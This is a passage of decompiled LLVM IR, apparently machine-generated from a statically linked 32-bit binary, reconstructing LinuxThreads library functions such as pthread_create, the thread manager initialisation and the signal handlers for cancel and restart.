  store i32 134533971, i32* %stack_var_-284, align 4
  %v1_804d815 = call i32 @sigemptyset(i32 %v2_804d7ac)
  store i32 %v1_804d815, i32* %eax.global-to-local, align 4
  %v0_804d820 = load i32, i32* @global_var_80626f0.146, align 16
  %v5_804d826 = call i32 @__libc_sigaction(i32 %v0_804d820, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_804d826, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d82e

dec_label_pc_804d82e:                             ; preds = %dec_label_pc_804d7a1, %dec_label_pc_804d809
  %v2_804d831 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804d831, i32* @ebx, align 4
  %v1_804d839 = call i32 @sigemptyset(i32 %v2_804d831)
  store i32 %v2_804d831, i32* %eax.global-to-local, align 4
  %v0_804d840 = load i32, i32* @global_var_80626e8.171, align 8
  %v2_804d847 = call i32 @__GI_sigaddset(i32 %v2_804d831, i32 %v0_804d840)
  store i32 %v2_804d847, i32* %eax.global-to-local, align 4
  %v4_804d854 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v5_804d854 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v4_804d854, i32 0)
  store i32 %v5_804d854, i32* %eax.global-to-local, align 4
  store i32 %v2_804d831, i32* @esi, align 4
  %v1_804d862 = call i32 @__GI_sigdelset(i32 %v2_804d831)
  store i32 %v2_804d831, i32* %eax.global-to-local, align 4
  %v0_804d869 = load i32, i32* @global_var_80626ec.155, align 4
  %v2_804d870 = call i32 @__GI_sigaddset(i32 %v2_804d831, i32 %v0_804d869)
  store i32 %v2_804d870, i32* %eax.global-to-local, align 4
  %v5_804d87d = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_804d854, i32 0)
  store i32 %v5_804d87d, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ebx, align 4
  store i32 %v2_804d831, i32* @esi, align 4
  %v2_804d88b = call i32 @on_exit(i32 134534487, i32 0)
  store i32 %v2_804d88b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d893

dec_label_pc_804d893:                             ; preds = %entry, %dec_label_pc_804d82e
  %.0 = phi i32 [ undef, %entry ], [ %v2_804d88b, %dec_label_pc_804d82e ]
  store i32 %v0_804d6fa, i32* @ebx, align 4
  store i32 %v0_804d6f9, i32* @esi, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_804d831, { 2, 4, 1, 5, 3, 6, 0, 7, 8 }
  uselistorder i32 %v2_804d782, { 1, 0 }
  uselistorder i32 %v2_804d77d, { 3, 2, 1, 0 }
  uselistorder i32 %v3_804d75b, { 1, 2, 0 }
  uselistorder i32* %stack_var_-284, { 0, 3, 1, 4, 2, 6, 5 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 4, 0, 8, 7, 6, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 (i32)* @sigemptyset, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* @global_var_8065058.180, { 1, 0 }
  uselistorder label %dec_label_pc_804d893, { 1, 0 }
  uselistorder label %dec_label_pc_804d82e, { 1, 0 }
  uselistorder label %dec_label_pc_804d7a1, { 1, 0 }
  uselistorder label %dec_label_pc_804d75b, { 1, 0 }
  uselistorder label %dec_label_pc_804d74e, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804d89c = load i32, i32* @ebx, align 4
  %v0_804d8a3 = load i32, i32* @global_var_8063000.188, align 4096
  %v1_804d8a8 = inttoptr i32 %v0_804d8a3 to i32*
  store i32 1, i32* %v1_804d8a8, align 4
  %v0_804d8ae = load i32, i32* @global_var_8062fec.134, align 4
  %v1_804d8ae = icmp eq i32 %v0_804d8ae, 0
  %v1_804d8b5 = icmp eq i1 %v1_804d8ae, false
  br i1 %v1_804d8b5, label %dec_label_pc_804d8bc, label %dec_label_pc_804d8b7

dec_label_pc_804d8b7:                             ; preds = %entry
  %v1_804d8b7 = call i32 @pthread_initialize(i32 %v0_804d89c)
  br label %dec_label_pc_804d8bc

dec_label_pc_804d8bc:                             ; preds = %entry, %dec_label_pc_804d8b7
  %v0_804d8bc = load i32, i32* @global_var_80672b4.157, align 4
  %factor = mul i32 %v0_804d8bc, 2
  %v3_804d8c4 = add i32 %factor, -32
  store i32 %v3_804d8c4, i32* %stack_var_-188, align 4
  %v1_804d8c9 = call i32 @malloc(i32 %v3_804d8c4)
  store i32 %v1_804d8c9, i32* @global_var_8062ff0.135, align 16
  %v1_804d8db = icmp eq i32 %v1_804d8c9, 0
  br i1 %v1_804d8db, label %dec_label_pc_804da99, label %dec_label_pc_804d8e3

dec_label_pc_804d8e3:                             ; preds = %dec_label_pc_804d8bc
  %v0_804d8e3 = load i32, i32* @global_var_80672b4.157, align 4
  %v2_804d8eb = mul i32 %v0_804d8e3, 2
  %v3_804d8eb = add i32 %v1_804d8c9, -32
  %v4_804d8eb = add i32 %v3_804d8eb, %v2_804d8eb
  store i32 %v4_804d8eb, i32* @global_var_8062ff4.137, align 4
  %v2_804d8f4 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_804d8f4, i32* %stack_var_-188, align 4
  %v1_804d8fc = call i32 @__GI_pipe(i32 %v2_804d8f4)
  %v8_804d904 = icmp eq i32 %v1_804d8fc, -1
  %v1_804d905 = icmp eq i1 %v8_804d904, false
  br i1 %v1_804d905, label %dec_label_pc_804d91a, label %dec_label_pc_804d907

dec_label_pc_804d907:                             ; preds = %dec_label_pc_804d8e3
  %v0_804d90a = load i32, i32* @global_var_8062ff0.135, align 16
  store i32 %v0_804d90a, i32* %stack_var_-188, align 4
  %v1_804d910 = call i32 @free(i32 %v0_804d90a)
  br label %dec_label_pc_804da0b

dec_label_pc_804d91a:                             ; preds = %dec_label_pc_804d8e3
  %v0_804d91a = load i32, i32* @global_var_8067664.189, align 4
  %v1_804d91f = icmp eq i32 %v0_804d91a, 0
  br i1 %v1_804d91f, label %dec_label_pc_804d928, label %dec_label_pc_804d928.thread

dec_label_pc_804d928.thread:                      ; preds = %dec_label_pc_804d91a
  store i32 %v0_804d91a, i32* @global_var_80624bc.190, align 4
  br label %dec_label_pc_804d935

dec_label_pc_804d928:                             ; preds = %dec_label_pc_804d91a
  %v0_804d928.pre = load i32, i32* @global_var_80624bc.190, align 4
  %v1_804d928 = icmp eq i32 %v0_804d928.pre, 0
  br i1 %v1_804d928, label %dec_label_pc_804d9bd, label %dec_label_pc_804d935

dec_label_pc_804d935:                             ; preds = %dec_label_pc_804d928.thread, %dec_label_pc_804d928
  %v0_804d935 = load i32, i32* @global_var_8067654.149, align 4
  %v0_804d93a = load i8, i8* @global_var_80624c0.191, align 64
  %v1_804d93a = zext i8 %v0_804d93a to i32
  %v4_804d93a = or i32 %v1_804d93a, %v0_804d935
  %v3_804d940 = trunc i32 %v4_804d93a to i8
  %v5_804d940 = icmp slt i8 %v3_804d940, 0
  %v1_804d942 = icmp eq i1 %v5_804d940, false
  br i1 %v1_804d942, label %dec_label_pc_804d9bd, label %dec_label_pc_804d944

dec_label_pc_804d944:                             ; preds = %dec_label_pc_804d935
  store i32 0, i32* @edx, align 4
  %v0_804d946 = load i32, i32* bitcast (i32** @global_var_806251c.162 to i32*), align 4
  store i32 %v0_804d946, i32* @eax, align 4
  %v0_804d94b = load i32, i32* %stack_var_-188, align 4
  %v1_804d94b = call i32 @__pthread_lock(i32 %v0_804d94b)
  %v3_804d950 = load i32, i32* %stack_var_-12, align 4
  %v0_804d95c = load i32, i32* @global_var_8062ff4.137, align 4
  store i32 134528302, i32* %stack_var_-188, align 4
  %v4_804d967 = call i32 @clone(i32 134528302, i32 %v0_804d95c, i32 3840, i32 %v3_804d950)
  store i32 %v4_804d967, i32* @eax, align 4
  store i32 %v4_804d967, i32* @ebx, align 4
  %v10_804d971 = icmp eq i32 %v4_804d967, -1
  br i1 %v10_804d971, label %dec_label_pc_804d9a8, label %dec_label_pc_804d976

dec_label_pc_804d976:                             ; preds = %dec_label_pc_804d944
  store i32 ptrtoint (i32* @global_var_8062500.136 to i32), i32* @global_var_80626ac.192, align 4
  store i32 8, i32* @global_var_80626a8.193, align 8
  store i32 ptrtoint (i32* @global_var_8062500.136 to i32), i32* @global_var_806765c.150, align 4
  store i32 2049, i32* @global_var_8062510.194, align 16
  store i32 %v4_804d967, i32* @global_var_8062514.140, align 4
  %v0_804d9a3 = call i32 @__linuxthreads_create_event()
  br label %dec_label_pc_804d9a8

dec_label_pc_804d9a8:                             ; preds = %dec_label_pc_804d944, %dec_label_pc_804d976
  %v0_804d9ab = load i32, i32* bitcast (i32** @global_var_806251c.162 to i32*), align 4
  store i32 %v0_804d9ab, i32* %stack_var_-188, align 4
  %v1_804d9b1 = inttoptr i32 %v0_804d9ab to i32*
  %v2_804d9b1 = call i32 @__pthread_unlock(i32* %v1_804d9b1)
  %v0_804d9b9 = load i32, i32* @ebx, align 4
  %v1_804d9b9 = icmp eq i32 %v0_804d9b9, 0
  %v1_804d9bb = icmp eq i1 %v1_804d9b9, false
  br i1 %v1_804d9bb, label %dec_label_pc_804d9de, label %dec_label_pc_804d9bd

dec_label_pc_804d9bd:                             ; preds = %dec_label_pc_804d9a8, %dec_label_pc_804d935, %dec_label_pc_804d928
  %v3_804d9bd = load i32, i32* %stack_var_-12, align 4
  %v0_804d9c9 = load i32, i32* @global_var_8062ff4.137, align 4
  store i32 134526669, i32* %stack_var_-188, align 4
  %v4_804d9d4 = call i32 @clone(i32 134526669, i32 %v0_804d9c9, i32 3840, i32 %v3_804d9bd)
  store i32 %v4_804d9d4, i32* @ebx, align 4
  br label %dec_label_pc_804d9de

dec_label_pc_804d9de:                             ; preds = %dec_label_pc_804d9a8, %dec_label_pc_804d9bd
  %v0_804da3d = phi i32 [ %v0_804d9b9, %dec_label_pc_804d9a8 ], [ %v4_804d9d4, %dec_label_pc_804d9bd ]
  %v10_804d9de = icmp eq i32 %v0_804da3d, -1
  %v1_804d9e1 = icmp eq i1 %v10_804d9de, false
  br i1 %v1_804d9e1, label %dec_label_pc_804da16, label %dec_label_pc_804d9e3

dec_label_pc_804d9e3:                             ; preds = %dec_label_pc_804d9de
  %v0_804d9e6 = load i32, i32* @global_var_8062ff0.135, align 16
  store i32 %v0_804d9e6, i32* %stack_var_-188, align 4
  %v1_804d9ec = call i32 @free(i32 %v0_804d9e6)
  store i32 %v0_804d9e6, i32* @ebx, align 4
  %v3_804d9f2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_804d9f2, i32* %stack_var_-188, align 4
  %v1_804d9f9 = call i32 @__libc_close(i32 %v3_804d9f2)
  store i32 %v3_804d9f2, i32* @ecx, align 4
  store i32 %tmp8, i32* %stack_var_-188, align 4
  %v1_804da06 = call i32 @__libc_close(i32 %tmp8)
  br label %dec_label_pc_804da0b

dec_label_pc_804da0b:                             ; preds = %dec_label_pc_804d907, %dec_label_pc_804d9e3
  br label %dec_label_pc_804da99

dec_label_pc_804da16:                             ; preds = %dec_label_pc_804d9de
  store i32 2049, i32* @global_var_8062510.194, align 16
  store i32 %tmp8, i32* @global_var_80626e4.143, align 4
  %v3_804da2c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_804da2c, i32* @global_var_8067668.179, align 8
  %v0_804da38 = load i32, i32* @global_var_8067660.145, align 32
  store i32 %v0_804da3d, i32* @global_var_8062514.140, align 4
  %v1_804da43 = icmp eq i32 %v0_804da38, 0
  br i1 %v1_804da43, label %dec_label_pc_804da71.preheader, label %dec_label_pc_804da47

dec_label_pc_804da47:                             ; preds = %dec_label_pc_804da16
  %v0_804da47 = load i32, i32* @global_var_80626f0.146, align 16
  %tmp18 = icmp slt i32 %v0_804da47, 1
  br i1 %tmp18, label %dec_label_pc_804da71.preheader, label %dec_label_pc_804da50

dec_label_pc_804da50:                             ; preds = %dec_label_pc_804da47
  store i32 %v0_804da47, i32* %stack_var_-188, align 4
  %v1_804da54 = call i32 @__GI_raise(i32 %v0_804da47)
  %v1_804da59 = call i32 @thread_self.7(i32 %v0_804da47)
  store i32 %v1_804da59, i32* %stack_var_-188, align 4
  %v1_804da61 = call i32 @__pthread_wait_for_restart_signal(i32 %v1_804da59)
  br label %dec_label_pc_804da71.preheader

dec_label_pc_804da71.preheader:                   ; preds = %dec_label_pc_804da47, %dec_label_pc_804da16, %dec_label_pc_804da50
  %v2_804da71 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_804da71

dec_label_pc_804da71:                             ; preds = %dec_label_pc_804da71.preheader, %dec_label_pc_804da8d
  %v0_804da7c = load i32, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804da7c, i32* %stack_var_-188, align 4
  %v3_804da82 = call i32 @__libc_write(i32 %v0_804da7c, i32 %v2_804da71, i32 148)
  %v8_804da8a = icmp eq i32 %v3_804da82, -1
  %v1_804da8b = icmp eq i1 %v8_804da8a, false
  br i1 %v1_804da8b, label %dec_label_pc_804da97, label %dec_label_pc_804da8d

dec_label_pc_804da8d:                             ; preds = %dec_label_pc_804da71
  %v0_804da8d = load i32, i32* %stack_var_-188, align 4
  %v1_804da8d = call i32 @__errno_location(i32 %v0_804da8d)
  %v1_804da92 = inttoptr i32 %v1_804da8d to i32*
  %v2_804da92 = load i32, i32* %v1_804da92, align 4
  %v11_804da92 = icmp eq i32 %v2_804da92, 4
  br i1 %v11_804da92, label %dec_label_pc_804da71, label %dec_label_pc_804da8d.dec_label_pc_804da97_crit_edge

dec_label_pc_804da8d.dec_label_pc_804da97_crit_edge: ; preds = %dec_label_pc_804da8d
  br label %dec_label_pc_804da97

dec_label_pc_804da97:                             ; preds = %dec_label_pc_804da71, %dec_label_pc_804da8d.dec_label_pc_804da97_crit_edge
  br label %dec_label_pc_804da99

dec_label_pc_804da99:                             ; preds = %dec_label_pc_804d8bc, %dec_label_pc_804da0b, %dec_label_pc_804da97
  %v0_804daa0 = phi i32 [ -1, %dec_label_pc_804d8bc ], [ -1, %dec_label_pc_804da0b ], [ 0, %dec_label_pc_804da97 ]
  store i32 %v0_804d89c, i32* @ebx, align 4
  ret i32 %v0_804daa0

; uselistorder directives
  uselistorder i32 %v0_804da47, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804da3d, { 1, 0 }
  uselistorder i32 %v4_804d967, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804d8f4, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 %tmp8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804da99, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804da97, { 1, 0 }
  uselistorder label %dec_label_pc_804da71, { 1, 0 }
  uselistorder label %dec_label_pc_804da71.preheader, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804da0b, { 1, 0 }
  uselistorder label %dec_label_pc_804d9de, { 1, 0 }
  uselistorder label %dec_label_pc_804d9a8, { 1, 0 }
  uselistorder label %dec_label_pc_804d935, { 1, 0 }
  uselistorder label %dec_label_pc_804d8bc, { 1, 0 }
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_804daa1 = load i32, i32* @ebx, align 4
  %v0_804daa8 = load i32, i32* @global_var_80626e4.143, align 4
  %v2_804daa8 = icmp slt i32 %v0_804daa8, 0
  %v1_804daaf = icmp eq i1 %v2_804daa8, false
  br i1 %v1_804daaf, label %dec_label_pc_804dac3, label %dec_label_pc_804dab1

dec_label_pc_804dab1:                             ; preds = %entry
  %v1_804dab1 = call i32 @__pthread_initialize_manager(i32 %v0_804daa1)
  %v2_804dabb = icmp slt i32 %v1_804dab1, 0
  br i1 %v2_804dabb, label %dec_label_pc_804db4b, label %dec_label_pc_804dac3

dec_label_pc_804dac3:                             ; preds = %dec_label_pc_804dab1, %entry
  %v1_804dac3 = call i32 @thread_self.7(i32 %v0_804daa1)
  store i32 %v1_804dac3, i32* %stack_var_-152, align 4
  store i32 %v1_804dac3, i32* @ebx, align 4
  %v2_804daf8 = ptrtoint i32* %stack_var_-132 to i32
  store i32 2, i32* %stack_var_-188, align 4
  %v4_804db01 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_804daf8)
  %v2_804db09 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_804db09

dec_label_pc_804db09:                             ; preds = %dec_label_pc_804db25, %dec_label_pc_804dac3
  %v0_804db14 = load i32, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804db14, i32* %stack_var_-188, align 4
  %v3_804db1a = call i32 @__libc_write(i32 %v0_804db14, i32 %v2_804db09, i32 148)
  %v8_804db22 = icmp eq i32 %v3_804db1a, -1
  %v1_804db23 = icmp eq i1 %v8_804db22, false
  br i1 %v1_804db23, label %dec_label_pc_804db2f, label %dec_label_pc_804db25

dec_label_pc_804db25:                             ; preds = %dec_label_pc_804db09
  %v0_804db25 = load i32, i32* %stack_var_-188, align 4
  %v1_804db25 = call i32 @__errno_location(i32 %v0_804db25)
  %v1_804db2a = inttoptr i32 %v1_804db25 to i32*
  %v2_804db2a = load i32, i32* %v1_804db2a, align 4
  %v11_804db2a = icmp eq i32 %v2_804db2a, 4
  br i1 %v11_804db2a, label %dec_label_pc_804db09, label %dec_label_pc_804db2f

dec_label_pc_804db2f:                             ; preds = %dec_label_pc_804db25, %dec_label_pc_804db09
  %v0_804db2f = load i32, i32* @ebx, align 4
  store i32 %v0_804db2f, i32* @eax, align 4
  %v0_804db31 = call i32 @suspend.6()
  %v0_804db36 = load i32, i32* @ebx, align 4
  %v1_804db36 = add i32 %v0_804db36, 52
  %v2_804db36 = inttoptr i32 %v1_804db36 to i32*
  %v3_804db36 = load i32, i32* %v2_804db36, align 4
  %v4_804db36 = icmp eq i32 %v3_804db36, 0
  %v1_804db3a = icmp eq i1 %v4_804db36, false
  br i1 %v1_804db3a, label %dec_label_pc_804db48, label %dec_label_pc_804db3c

dec_label_pc_804db3c:                             ; preds = %dec_label_pc_804db2f
  %v1_804db43 = add i32 %v0_804db36, 48
  %v2_804db43 = inttoptr i32 %v1_804db43 to i32*
  %v3_804db43 = load i32, i32* %v2_804db43, align 4
  store i32 %v3_804db43, i32* %arg1, align 4
  %v0_804db48.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804db48

dec_label_pc_804db48:                             ; preds = %dec_label_pc_804db2f, %dec_label_pc_804db3c
  %v0_804db48 = phi i32 [ %v0_804db36, %dec_label_pc_804db2f ], [ %v0_804db48.pre, %dec_label_pc_804db3c ]
  %v1_804db48 = add i32 %v0_804db48, 52
  %v2_804db48 = inttoptr i32 %v1_804db48 to i32*
  %v3_804db48 = load i32, i32* %v2_804db48, align 4
  br label %dec_label_pc_804db4b

dec_label_pc_804db4b:                             ; preds = %dec_label_pc_804dab1, %dec_label_pc_804db48
  %v0_804db4b = phi i32 [ 11, %dec_label_pc_804dab1 ], [ %v3_804db48, %dec_label_pc_804db48 ]
  ret i32 %v0_804db4b

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 ()* @suspend.6, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %dec_label_pc_804db4b, { 1, 0 }
  uselistorder label %dec_label_pc_804db48, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v1_804db55 = call i32 @pthread_initialize(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804db55

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @pthread_handle_sigcancel(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db5a = load i32, i32* @ebx, align 4
  store i32 %v0_804db5a, i32* %stack_var_-4, align 4
  %v4_804db5a = ptrtoint i32* %stack_var_-4 to i32
  %v1_804db5e = call i32 @thread_self.7(i32 %v0_804db5a)
  store i32 %v1_804db5e, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_804db67 = icmp eq i32 %v1_804db5e, 134620416
  %v1_804db6c = icmp eq i1 %v6_804db67, false
  br i1 %v1_804db6c, label %dec_label_pc_804db7a, label %dec_label_pc_804db6e

dec_label_pc_804db6e:                             ; preds = %entry
  %v2_804db72 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804db72, i32* %eax.global-to-local, align 4
  %v2_804db74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db74, i32* @ebx, align 4
  %v1_804db75 = call i32 @__pthread_manager_sighandler(i32 %arg1)
  store i32 %v1_804db75, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804db7a

dec_label_pc_804db7a:                             ; preds = %entry, %dec_label_pc_804db6e
  %v0_804dbc1 = phi i32 [ %v1_804db5e, %entry ], [ %v1_804db75, %dec_label_pc_804db6e ]
  %v0_804db7a = load i32, i32* @global_var_8062ff8.159, align 8
  %v1_804db7a = icmp eq i32 %v0_804db7a, 0
  br i1 %v1_804db7a, label %dec_label_pc_804dbaf, label %dec_label_pc_804db83

dec_label_pc_804db83:                             ; preds = %dec_label_pc_804db7a
  %v1_804db83 = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  %v12_804db83 = icmp eq i32 %v0_804dbc1, %v1_804db83
  %v1_804db89 = icmp eq i1 %v12_804db83, false
  br i1 %v1_804db89, label %dec_label_pc_804db83.dec_label_pc_804dba1_crit_edge, label %dec_label_pc_804db8b

dec_label_pc_804db83.dec_label_pc_804dba1_crit_edge: ; preds = %dec_label_pc_804db83
  br label %dec_label_pc_804dba1

dec_label_pc_804db8b:                             ; preds = %dec_label_pc_804db83
  %v0_804db93 = load i32, i32* @global_var_8062514.140, align 4
  %v4_804db99 = call i32 @waitpid(i32 %v0_804db93, i32 0, i32 -2147483648, i32 %v0_804dbc1)
  store i32 %v4_804db99, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dba1

dec_label_pc_804dba1:                             ; preds = %dec_label_pc_804db83.dec_label_pc_804dba1_crit_edge, %dec_label_pc_804db8b
  %v0_804dba4 = load i32, i32* @global_var_8062ffc.160, align 4
  %v1_804dbaa = call i32 @__GI__exit(i32 %v0_804dba4)
  unreachable

dec_label_pc_804dbaf:                             ; preds = %dec_label_pc_804db7a
  %v1_804dbaf = add i32 %v0_804dbc1, 66
  %v2_804dbaf = inttoptr i32 %v1_804dbaf to i8*
  %v3_804dbaf = load i8, i8* %v2_804dbaf, align 1
  %v4_804dbaf = icmp eq i8 %v3_804dbaf, 0
  br i1 %v4_804dbaf, label %dec_label_pc_804dbe7, label %dec_label_pc_804dbb5

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804dbaf
  %v1_804dbb5 = add i32 %v0_804dbc1, 64
  %v2_804dbb5 = inttoptr i32 %v1_804dbb5 to i8*
  %v3_804dbb5 = load i8, i8* %v2_804dbb5, align 1
  %v4_804dbb5 = icmp eq i8 %v3_804dbb5, 0
  %v1_804dbb9 = icmp eq i1 %v4_804dbb5, false
  br i1 %v1_804dbb9, label %dec_label_pc_804dbe7, label %dec_label_pc_804dbbb

dec_label_pc_804dbbb:                             ; preds = %dec_label_pc_804dbb5
  %v1_804dbbb = add i32 %v0_804dbc1, 65
  %v2_804dbbb = inttoptr i32 %v1_804dbbb to i8*
  %v3_804dbbb = load i8, i8* %v2_804dbbb, align 1
  %v12_804dbbb = icmp eq i8 %v3_804dbbb, 1
  %v1_804dbbf = icmp eq i1 %v12_804dbbb, false
  br i1 %v1_804dbbf, label %dec_label_pc_804dbcf, label %dec_label_pc_804dbc1

dec_label_pc_804dbc1:                             ; preds = %dec_label_pc_804dbbb
  store i32 %v4_804db5a, i32* %eax.global-to-local, align 4
  %v2_804dbca = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804db5a)
  store i32 %v2_804dbca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbcf

dec_label_pc_804dbcf:                             ; preds = %dec_label_pc_804dbbb, %dec_label_pc_804dbc1
  %stack_var_-24.0 = phi i32 [ %tmp10, %dec_label_pc_804dbbb ], [ %v4_804db5a, %dec_label_pc_804dbc1 ]
  %v0_804dbd6 = phi i32 [ %v0_804dbc1, %dec_label_pc_804dbbb ], [ %v2_804dbca, %dec_label_pc_804dbc1 ]
  %v1_804dbcf = add i32 %v0_804dbd6, 40
  %v2_804dbcf = inttoptr i32 %v1_804dbcf to i32*
  %v3_804dbcf = load i32, i32* %v2_804dbcf, align 4
  store i32 %v3_804dbcf, i32* @edx, align 4
  %v1_804dbd2 = icmp eq i32 %v3_804dbcf, 0
  br i1 %v1_804dbd2, label %dec_label_pc_804dbe7, label %dec_label_pc_804dbd6

dec_label_pc_804dbd6:                             ; preds = %dec_label_pc_804dbcf
  store i32 0, i32* %v2_804dbcf, align 4
  %v0_804dbdd = load i32, i32* %eax.global-to-local, align 4
  %v4_804dbe2 = call i32 @siglongjmp(i32 %v3_804dbcf, i32 1, i32 %v0_804dbdd, i32 %v0_804dbdd)
  store i32 %v4_804dbe2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbe7

dec_label_pc_804dbe7:                             ; preds = %dec_label_pc_804dbcf, %dec_label_pc_804dbb5, %dec_label_pc_804dbaf, %dec_label_pc_804dbd6
  %stack_var_-24.1 = phi i32 [ %tmp10, %dec_label_pc_804dbaf ], [ %tmp10, %dec_label_pc_804dbb5 ], [ %stack_var_-24.0, %dec_label_pc_804dbcf ], [ %stack_var_-24.0, %dec_label_pc_804dbd6 ]
  store i32 %stack_var_-24.1, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 1, 0 }
  uselistorder i32 %v0_804dbc1, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 %v1_804db5e, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 7, 3, 4, 5, 0, 6, 8 }
  uselistorder label %dec_label_pc_804dbe7, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804dbcf, { 1, 0 }
  uselistorder label %dec_label_pc_804dba1, { 1, 0 }
  uselistorder label %dec_label_pc_804db7a, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804dbee = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  store i32 %arg1, i32* @edx, align 4
  %v2_804dbf7 = add i32 %v1_804dbee, 32
  %v3_804dbf7 = inttoptr i32 %v2_804dbf7 to i32*
  store i32 %arg1, i32* %v3_804dbf7, align 4
  %v1_804dbfa = add i32 %v1_804dbee, 36
  %v2_804dbfa = inttoptr i32 %v1_804dbfa to i32*
  %v3_804dbfa = load i32, i32* %v2_804dbfa, align 4
  %v1_804dbfd = icmp eq i32 %v3_804dbfa, 0
  br i1 %v1_804dbfd, label %dec_label_pc_804dc0b, label %dec_label_pc_804dc01

dec_label_pc_804dc01:                             ; preds = %entry
  %v0_804dc01 = load i32, i32* @ecx, align 4
  %v4_804dc06 = call i32 @siglongjmp(i32 %v3_804dbfa, i32 1, i32 %v0_804dc01, i32 %v0_804dc01)
  br label %dec_label_pc_804dc0b

dec_label_pc_804dc0b:                             ; preds = %entry, %dec_label_pc_804dc01
  %v0_804dc0e = phi i32 [ 0, %entry ], [ %v4_804dc06, %dec_label_pc_804dc01 ]
  ret i32 %v0_804dc0e

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder i32 (i32)* @thread_self.7, { 6, 5, 4, 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc0b, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v1_804dc14 = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_804dc14, i32* @global_var_8063000.188, align 4096
  ret i32 %v1_804dc14
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg3 to i32
  %v0_804dc25 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804dc35 = urem i32 %arg1, 1024
  %v2_804dc3a = mul nuw nsw i32 %v1_804dc35, 16
  %v1_804dc3d = add i32 %v2_804dc3a, ptrtoint (i32* @global_var_805e300.147 to i32)
  store i32 %v1_804dc3d, i32* @esi, align 4
  store i32 %v1_804dc3d, i32* @eax, align 4
  %v1_804dc45 = call i32 @__pthread_lock(i32 %v0_804dc25)
  %v0_804dc4a = load i32, i32* @esi, align 4
  %v1_804dc4a = add i32 %v0_804dc4a, 8
  %v2_804dc4a = inttoptr i32 %v1_804dc4a to i32*
  %v3_804dc4a = load i32, i32* %v2_804dc4a, align 4
